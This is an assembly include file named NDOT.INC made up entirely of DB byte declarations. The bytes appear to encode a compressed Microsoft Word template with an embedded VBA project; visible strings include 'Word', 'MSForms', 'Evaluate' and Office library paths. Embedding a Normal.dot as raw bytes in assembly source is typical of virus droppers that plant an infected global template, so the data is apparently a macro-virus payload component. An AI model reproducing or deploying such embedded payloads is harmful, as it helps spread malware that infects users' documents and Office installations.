DB 0FAH,06CH,000H,05FH,002H,02CH,003H,042H,05FH,000H,005H,0A8H,04AH,002H,060H
DB 043H,002H,070H,01EH,079H,00FH,00FH,008H,010H,0A2H,080H,0BFH,0EAH,032H,067H
DB 033H,063H,005H,004H,008H,019H,00FH,009H,00AH,010H,01BH,002H,00CH,07AH,0B6H
DB 0ADH,064H,002H,098H,072H,002H,010H,00FH,003H,00FH,010H,0FBH,0E5H,00FH,010H
DB 007H,010H,008H,012H,0E2H,005H,07AH,005H,006H,007H,018H,00FH,008H,00BH,010H
DB 049H,002H,00DH,084H,002H,002H,005H,002H,003H,00DH,0F6H,078H,0EFH,077H,000H
DB 06DH,002H,014H,00FH,003H,00FH,010H,00BH,010H,014H,00FH,080H,00BH,01DH,00FH
DB 00CH,006H,010H,054H,002H,008H,0A3H,0D8H,002H,007H,05FH,07FH,01FH,076H,003H
DB 013H,00FH,004H,00FH,010H,00CH,010H,010H,0D2H,080H,006H,002H,012H,063H,00FH
DB 013H,002H,002H,00BH,00FH,003H,00FH,010H,022H,066H,000H,044H,0D5H,000H,052H
DB 036H,027H,069H,000H,063H,0D2H,082H,074H,012H,086H,06FH,0D2H,0EAH,073H,00CH
DB 02CH,020H,03FH,03AH,022H,0F2H,0FDH,005H,083H,082H,035H,03FH,03AH,002H,018H
DB 083H,08CH,03FH,03AH,039H,036H,003H,00AH,037H,03AH,038H,022H,0A8H,030H,000H
DB 023H,000H,034H,023H,0A2H,002H,036H,03BH,03EH,072H,000H,071H,022H,0B2H,069H
DB 000H,076H,022H,0A2H,073H,000H,020H,0F2H,094H,065H,002H,006H,0EAH,045H,050H
DB 0E4H,01CH,067H,002H,006H,061H,012H,09CH,023H,0C8H,033H,01EH,003H,0B6H,072H
DB 004H,028H,06FH,000H,066H,052H,0F3H,020H,0ADH,01AH,032H,026H,066H,002H,00AH
DB 003H,018H,065H,032H,01EH,04FH,002H,00CH,066H,002H,0D4H,063H,062H,013H,003H
DB 030H,053H,000H,057H,0ADH,056H,002H,022H,052H,032H,092H,003H,07EH,04FH,032H
DB 024H,042H,002H,082H,04DH,004H,022H,00DH,048H,057H,002H,056H,072H,002H,07CH
DB 020H,00AH,056H,000H,003H,02AH,030H,002H,082H,04FH,000H,062H,000H,06AH,002H
DB 048H,063H,05BH,020H,002H,03AH,069H,002H,010H,072H,0A7H,0FEH,012H,034H,0F3H
DB 0AEH,01BH,02FH,0B8H,000H,04FH,068H,030H,002H,0E4H,033H,002H,0E6H,099H,092H
DB 00BH,00AH,01FH,02EH,013H,024H,009H,004H,017H,02EH,0A7H,01AH,033H,0D6H,013H
DB 02EH,003H,004H,043H,000H,043H,068H,057H,042H,062H,04EH,002H,0CAH,04FH,002H
DB 0D4H,043H,04CH,053H,000H,059H,055H,0EDH,042H,01CH,054H,032H,0B8H,04DH,002H
DB 0FAH,053H,032H,0BCH,044H,002H,0ECH,04CH,002H,010H,003H,03CH,054H,002H,0B2H
DB 003H,0ECH,003H,0F4H,0D5H,005H,043H,08EH,041H,012H,064H,074H,002H,0E4H,06DH
DB 002H,0C2H,017H,0F6H,00BH,0C6H,0E0H,008H,0C6H,041H,000H,046H,000H,035H,054H
DB 0D5H,000H,031H,002H,0C4H,031H,0A2H,03CH,032H,012H,0F4H,042H,012H,014H,035H
DB 042H,06AH,02DH,002H,016H,031H,002H,082H,005H,014H,0AAH,0EDH,043H,052H,004H
DB 044H,002H,01EH,034H,002H,02AH,034H,002H,032H,003H,022H,035H,002H,00CH,007H
DB 0CCH,07DH,012H,06AH,003H,08AH,003H,0C2H,06BH,0A3H,003H,004H,00FH,0C6H,057H
DB 002H,0BEH,05CH,002H,004H,00BH,0C6H,04DH,002H,010H,045H,0AAH,06DH,000H,073H
DB 022H,030H,054H,002H,0ECH,036H,037H,044H,002H,048H,01FH,0B2H,074H,012H,0A0H
DB 009H,028H,020H,000H,005H,068H,023H,00EH,01FH,0B4H,062H,024H,042H,01DH,0B4H
DB 001H,000H,0AAH,056H,0E4H,008H,0EEH,033H,052H,070H,032H,002H,0D4H,044H,002H
DB 0F6H,038H,002H,048H,063H,008H,046H,012H,044H,037H,002H,0DAH,031H,055H,0EBH
DB 002H,0F0H,044H,004H,014H,042H,002H,026H,041H,002H,0DCH,02DH,002H,004H,003H
DB 0F0H,035H,002H,0F0H,033H,002H,004H,023H,0CCH,005H,0F0H,06FH,0DBH,00FH,0EEH
DB 00FH,0EEH,005H,0EEH,015H,0AEH,050H,012H,0B0H,053H,0C8H,045H,002H,008H,00FH
DB 0F2H,045H,092H,001H,00FH,0F2H,06FH,022H,0D6H,00FH,0F2H,007H,000H,00FH,0F2H
DB 02FH,0A6H,00FH,0F2H,000H,000H,0E1H,02EH,045H,00DH,08FH,0E0H,01AH,010H,085H
DB 02EH,002H,000H,056H,060H,08CH,04DH,00BH,0B4H,000H,000H,01CH,001H,027H,0BAH
DB 013H,002H,046H,012H,0E6H,044H,022H,0B6H,034H,055H,0D5H,002H,0ECH,02DH,002H
DB 0DCH,042H,012H,012H,041H,014H,006H,030H,012H,008H,042H,002H,00AH,042H,012H
DB 028H,045H,002H,01AH,025H,0CEH,0AEH,05FH,041H,062H,080H,003H,0FCH,013H,010H
DB 044H,012H,032H,035H,012H,02AH,01FH,006H,015H,006H,07FH,022H,07FH,022H,07BH
DB 022H,04DH,022H,0E6H,043H,0EBH,055H,074H,03AH,079H,002H,04FH,002H,08AH,046H
DB 004H,018H,013H,032H,00DH,00EH,013H,040H,04FH,022H,08AH,037H,022H,02EH,044H
DB 022H,0F4H,04CH,06FH,017H,02FH,02EH,016H,03CH,04BH,01AH,03FH,0E4H,065H,052H
DB 00CH,013H,060H,04CH,042H,018H,02FH,030H,035H,024H,001H,052H,0EEH,003H,000H
DB 004H,050H,0FFH,002H,000H,000H,006H,0A2H,07BH,008H,002H,008H,016H,0D6H,00BH
DB 003H,020H,0B2H,069H,0D6H,062H,053H,08AH,00FH,004H,00FH,010H,00FH,010H,03DH
DB 0A8H,005H,010H,000H,074H,04EH,056H,09DH,003H,055H,008H,004H,08DH,09AH,001H
DB 000H,018H,032H,0DEH,068H,002H,09EH,073H,012H,082H,02AH,000H,06FH,002H,0AEH
DB 075H,052H,014H,065H,052H,0B8H,074H,000H,00AH,000H,032H,033H,036H,064H,064H
DB 061H,008H,06FH,032H,031H,039H,092H,024H,02AH,044H,001H,011H,002H,099H,0F3H
DB 04CH,004H,040H,002H,0A9H,000H,0F3H,01AH,005H,064H,001H,0FEH,0FFH,001H,0B3H
DB 0E3H,005H,00CH,00FH,006H,00FH,010H,00FH,010H,002H,0E4H,002H,04DH,00FH,016H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH
DB 0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,01FH,000H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,003H,010H
DB 0A3H,098H,0C6H,077H,092H,0D1H,0D2H,011H,0BCH,0A4H,044H,0BCH,006H,045H,053H
DB 082H,093H,003H,014H,023H,078H,003H,008H,060H,022H,036H,080H,002H,004H,043H
DB 01CH,01DH,000H,0FFH,000H,020H,000H,000H,028H,000H,000H,004H,004H,057H,06FH
DB 072H,064H,0B5H,06BH,010H,000H,003H,004H,056H,000H,080H,042H,041H,0F7H,0E2H
DB 010H,000H,005H,004H,057H,069H,06EH,031H,036H,0C1H,07EH,006H,00BH,010H,000H
DB 033H,032H,007H,07FH,003H,01FH,04DH,061H,063H,0B3H,0B2H,010H,000H,008H,004H
DB 050H,072H,001H,000H,0C2H,054H,074H,06FH,031H,03AH,071H,010H,000H,006H,004H
DB 073H,074H,064H,06FH,06CH,065H,000H,000H,093H,060H,010H,000H,007H,000H,04DH
DB 053H,046H,06FH,072H,06DH,073H,043H,00FH,010H,028H,010H,000H,00CH,004H,0D2H
DB 07FH,073H,0D6H,07EH,074H,03CH,09EH,010H,000H,009H,002H,07CH,0FFH,003H,004H
DB 080H,004H,000H,05FH,045H,076H,061H,06CH,075H,0D2H,02DH,018H,0D9H,003H,040H
DB 04FH,066H,066H,069H,063H,000H,043H,065H,015H,075H,010H,000H,00FH,004H,054H
DB 0D6H,047H,004H,062H,063H,074H,081H,045H,002H,055H,004H,084H,045H,04DH,0F3H
DB 0C2H,099H,06FH,031H,0D4H,012H,003H,07CH,0D3H,045H,045H,0D2H,044H,0ECH,09CH
DB 010H,002H,0BCH,065H,001H,0E3H,0D2H,042H,051H,05BH,010H,000H,00BH,000H,041H
DB 0D6H,03BH,0D2H,03AH,0A5H,02AH,010H,0F2H,0AEH,0D2H,03FH,0D2H,092H,009H,018H
DB 0D6H,03FH,0F4H,0F6H,002H,05EH,000H,045H,06EH,061H,062H,06CH,065H,0D2H,040H
DB 0D5H,03FH,0EAH,0F3H,010H,019H,000H,032H,061H,077H,064H,002H,02AH,003H,018H
DB 064H,0FCH,0D3H,010H,000H,001H,000H,069H,060H,010H,010H,038H,00DH,000H,00EH
DB 000H,0D2H,045H,0D2H,044H,007H,090H,071H,0ACH,002H,0BFH,000H,0D2H,04FH,003H
DB 0FAH,063H,074H,04FH,068H,00BH,094H,002H,0E0H,002H,00FH,043H,0D4H,053H,065H
DB 06EH,074H,073H,00AH,027H,012H,02DH,000H,0D4H,058H,030H,076H,003H,057H,0C8H
DB 024H,043H,06FH,064H,0D6H,052H,0E1H,01CH,003H,01BH,0D4H,056H,0BAH,0CEH,002H
DB 0F1H,000H,049H,0D2H,088H,072H,074H,004H,06CH,069H,0C5H,002H,0C1H,000H,053H
DB 061H,076H,065H,092H,0D0H,003H,0D9H,017H,02AH,06AH,002H,086H,032H,0E5H,001H
DB 0F6H,0BBH,001H,012H,0BDH,0E2H,095H,004H,042H,03AH,047H,08EH,013H,0C4H,005H
DB 004H,0A2H,01FH,002H,018H,002H,03FH,0B4H,005H,01DH,006H,006H,00CH,002H,01FH
DB 0A0H,0B6H,0FFH,0FFH,00EH,002H,003H,002H,02AH,011H,002H,02AH,00CH,002H,008H
DB 003H,01BH,00CH,002H,0DEH,0D3H,046H,012H,024H,00AH,003H,003H,00FH,005H,0D5H
DB 0A4H,001H,080H,0B2H,080H,001H,000H,0D2H,079H,012H,011H,030H,02AH,002H,002H
DB 090H,009H,000H,000H,000H,070H,014H,006H,048H,003H,000H,082H,002H,000H,064H
DB 0E4H,004H,004H,000H,00FH,038H,000H,000H,01CH,000H,017H,01DH,0F2H,01BH,022H
DB 010H,063H,074H,005H,051H,000H,048H,000H,000H,040H,002H,000H,000H,00AH,006H
DB 002H,00AH,03DH,0ADH,002H,00AH,007H,002H,07CH,001H,014H,008H,006H,012H,080H
DB 000H,009H,002H,012H,080H,019H,0A2H,0DDH,0F2H,0CBH,00CH,002H,04AH,012H,03CH
DB 002H,00AH,016H,028H,02CH,000H,001H,039H,022H,036H,010H,022H,037H,03EH,002H
DB 019H,073H,092H,0EAH,092H,09BH,06FH,0C2H,0D5H,065H,050H,084H,082H,000H,00DH
DB 052H,0D2H,025H,05CH,000H,003H,062H,0BCH,047H,0F5H,0A6H,0B0H,034H,033H,030H
DB 02DH,022H,076H,000H,002H,004H,043H,000H,00AH,003H,002H,00EH,001H,012H,0F4H
DB 0A5H,023H,000H,032H,02EH,030H,023H,000H,010H,030H,023H,043H,03AH,000H,05CH
DB 057H,049H,04EH,044H,04FH,057H,092H,036H,053H,059H,053H,008H,000H,054H,045H
DB 04DH,082H,077H,054H,044H,04FH,04CH,045H,032H,02EH,010H,054H,04CH,042H,023H
DB 094H,000H,000H,008H,0F2H,07AH,000H,0F2H,08BH,061H,074H,022H,01DH,023H,000H
DB 02FH,000H,001H,016H,000H,007H,040H,020H,080H,002H,04DH,053H,000H,046H,023H
DB 0ADH,03EH,000H,00EH,021H,001H,006H,084H,09BH,045H,072H,004H,000H,000H,080H
DB 083H,09BH,02FH,000H,07AH,080H,009H,006H,070H,080H,001H,001H,046H,041H,046H
DB 000H,000H,035H,031H,034H,000H,031H,036H,032H,02DH,042H,038H,035H,033H,010H
DB 02DH,031H,031H,00AH,000H,044H,0F2H,04CH,039H,092H,01BH,034H,034H,034H,035H
DB 035H,033H,035H,00EH,034H,001H,048H,017H,000H,000H,046H,004H,033H,02EH,054H
DB 057H,044H,000H,023H,04DH,069H,063H,072H,06FH,073H,06FH,000H,000H,028H,066H
DB 074H,020H,002H,03DH,020H,000H,060H,020H,04FH,002H,062H,001H,0B0H,020H,000H
DB 001H,04CH,069H,062H,072H,061H,01CH,072H,079H,062H,0CBH,001H,01EH,050H,030H
DB 000H,090H,00DH,008H,000H,000H,013H,072H,002H,05FH,050H,033H,043H,032H,044H
DB 000H,044H,046H,038H,032H,02DH,043H,000H,000H,046H,045H,032H,037H,005H,050H
DB 041H,034H,01DH,050H,080H,04AH,050H,05CH,090H,056H,000H,00AH,042H,045H,05CH
DB 085H,028H,045H,058H,0A7H,028H,078H,0DCH,000H,077H,0DDH,083H,081H,095H,043H
DB 004H,002H,078H,04FH,033H,038H,044H,078H,082H,04FH,040H,075H,0B4H,015H,042H
DB 078H,02AH,098H,0C0H,02BH,080H,040H,08EH,0C4H,02CH,032H,000H,02CH,044H,0A2H
DB 0A5H,043H,02DH,035H,042H,046H,041H,092H,0D6H,030H,000H,000H,031H,042H,02DH
DB 042H,044H,045H,052H,035H,040H,078H,041H,041H,040H,077H,034H,0C0H,000H,000H
DB 002H,032H,001H,008H,055H,041H,052H,051H,055H,049H,056H,04FH,000H,053H,020H
DB 044H,000H,020H,045H,020H,050H,052H,04FH,000H,047H,052H,041H,04DH,041H,053H
DB 05CH,072H,0A3H,043H,052H,000H,000H,04FH,053H,04FH,046H,054H,000H,020H,04FH
DB 046H,046H,049H,043H,045H,05CH,001H,084H,000H,000H,001H,04DH,053H,04FH,039H
DB 037H,02EH,044H,00CH,04CH,04CH,048H,05CH,083H,025H,020H,000H,000H,038H,02EH
DB 030H,045H,092H,05CH,00FH,082H,0BFH,001H,000H,013H,0C2H,001H,08DH,004H,010H
DB 004H,09AH,019H,042H,0A8H,034H,0EFH,000H,06FH,063H,075H,06DH,032H,011H,01AH
DB 011H,04EH,004H,032H,000H,004H,000H,018H,040H,033H,054H,000H,068H,011H,040H
DB 038H,062H,0DAH,080H,08FH,063H,000H,075H,008H,002H,051H,000H,090H,062H,0D9H
DB 040H,0B6H,01CH,0C0H,006H,062H,0F4H,048H,042H,001H,031H,0C2H,0C4H,000H,000H
DB 0EBH,000H,0DCH,01EH,08BH,042H,002H,001H,005H,02CH,042H,01AH,08FH,09AH,022H
DB 042H,000H,009H,008H,00AH,02BH,042H,001H,010H,042H,001H,025H,08AH,01AH,0E1H
DB 02FH,0A2H,03EH,000H,003H,000H,0B0H,0C6H,0FEH,0FFH,009H,000H,0D3H,020H,007H
DB 01CH,001H,002H,009H,021H,002H,004H,004H,003H,010H,000H,000H,004H,08CH,006H
DB 08BH,07FH,000H,002H,069H,07FH,05DH,002H,084H,023H,075H,002H,02EH,00FH,049H
DB 006H,049H,049H,044H,03DH,022H,07BH,037H,037H,043H,036H,000H,086H,039H,038H
DB 041H,046H,02DH,044H,031H,039H,032H,013H,0F9H,022H,004H,043H,041H,034H,02DH
DB 016H,0F9H,084H,062H,034H,030H,002H,001H,07DH,022H,00DH,00AH,037H,0BAH,03DH
DB 00BH,076H,02FH,026H,048H,002H,01FH,004H,003H,00DH,080H,003H,00AH,04EH,061H
DB 06DH,065H,03DH,022H,037H,030H,046H,0DDH,002H,03AH,048H,065H,06CH,070H,043H
DB 06FH,0A0H,000H,06EH,074H,065H,078H,074H,003H,072H,030H,002H,013H,043H,04DH
DB 047H,03DH,022H,042H,038H,042H,080H,001H,041H,032H,037H,035H,044H,032H,042H
DB 00BH,004H,002H,01EH,044H,050H,042H,03DH,022H,037H,030H,000H,003H,037H,032H
DB 045H,046H,031H,030H,046H,030H,005H,004H,002H,018H,047H,043H,03DH,022H,032H
DB 038H,000H,009H,032H,041H,042H,037H,043H,038H,042H,038H,003H,004H,033H,037H
DB 002H,017H,00DH,00AH,05BH,048H,000H,000H,06FH,073H,074H,020H,045H,078H,074H
DB 065H,06EH,064H,065H,072H,020H,049H,06EH,066H,010H,000H,06FH,05DH,00DH,00AH
DB 008H,09CH,031H,03DH,07BH,033H,038H,033H,032H,044H,036H,034H,030H,009H,000H
DB 022H,081H,039H,030H,002H,0E6H,043H,046H,02DH,038H,045H,034H,033H,02DH,030H
DB 030H,041H,030H,000H,014H,043H,039H,031H,031H,030H,030H,035H,041H,07DH,03BH
DB 022H,08EH,03BH,008H,036H,030H,00DH,00AH,003H,083H,002H,05AH,062H,038H,06BH
DB 073H,070H,061H,063H,065H,002H,051H,00BH,0FAH,03DH,032H,037H,02CH,020H,003H
DB 004H,000H,0E0H,036H,032H,033H,02CH,020H,033H,037H,035H,02CH,020H,05AH,00DH
DB 00AH,01FH,0CEH,012H,07CH,004H,003H,0A3H,091H,01FH,0CEH,003H,015H,001H,000H
DB 001H,012H,0E2H,003H,0E2H,0FDH,043H,0B0H,006H,009H,002H,003H,015H,000H,0C0H
DB 004H,006H,018H,044H,000H,046H,01DH,002H,008H,017H,073H,06FH,020H,064H,06FH
DB 020H,036H,074H,066H,074H,020H,002H,093H,064H,0BCH,02AH,020H,000H,002H,038H
DB 062H,089H,003H,00CH,002H,027H,000H,022H,00EH,000H,003H,00CH,02EH,002H,00DH
DB 075H,023H,09BH,02EH,038H,0E0H,0FFH,000H,0F4H,039H,0B2H,071H,002H,046H,008H
DB 003H,00FH,09DH,056H,02AH,003H,07EH,00FH,004H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,0BFH,082H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,005H,010H,001H,0B2H,0E6H,06FH,0A2H,046H,070H,000H,04FH,000H,062H,0E2H
DB 0E8H,0EFH,0D7H,008H,0EAH,00FH,009H,00FH,010H,006H,010H,012H,0B2H,012H,005H
DB 04AH,005H,006H,006H,017H,00FH,007H,00CH,010H,05BH,002H,00EH,06FH,002H,004H
DB 00FH,003H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,007H,010H,005H,07AH,005H
DB 006H,007H,014H,00FH,008H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00BH,010H,005H,07AH,005H,006H,0FFH,01FH,00BH,018H,00FH,00CH,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,007H,010H,005H,07AH,005H,006H,007H,014H
DB 00FH,008H,00FH,010H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H

;----------------------------------(NDOT.INC)---------------------------------




